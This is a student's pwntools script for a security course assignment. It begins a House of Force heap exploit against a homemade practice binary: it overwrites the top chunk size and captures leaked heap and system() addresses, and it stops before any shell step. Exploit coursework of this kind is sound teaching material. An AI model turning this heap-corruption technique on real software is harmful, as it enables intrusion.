'''
Creators:       Malachi Parks
Section:        CPEG476-010
Assignment:     PCP23: 
File Description:  House of Force on a homemade binary created by andy

Checksec info:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   54) Symbols       No    0               2               PCP23

File info:
PCP23: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=599cce1bcb9d78f2c8309f4e8ea8166ff5ab9ff4, for GNU/Linux 3.2.0, not stripped
'''

# Importing Libaries
from pwn import *
filename = "./PCP23"
elf = ELF(filename)
context.arch = 'amd64'

# Variables to be sent
name=b"Malachi"
minChunkSize=b"24"
overwriteTop=b"\xff"*32
heapLeak=b""
sysCall=b""

# Start process
p = process(filename)

# Set up small chunk to overwrite topchunk
p.sendline(name)
p.sendline(minChunkSize)

# Store Heap Leak (Still overwriting top chunk)
p.recvuntil(b"Your chunk m'lady: ")
heapLeak=p.recvuntil(b"\n")

# Finishing overwrite topchunk
p.sendline(overwriteTop)

# Storing system leak
p.recvuntil(b"And now for system(")
sysCall=p.recvuntil(")\n")

print("HEAPLEAK ",heapLeak)
print("System Leak ",sysCall)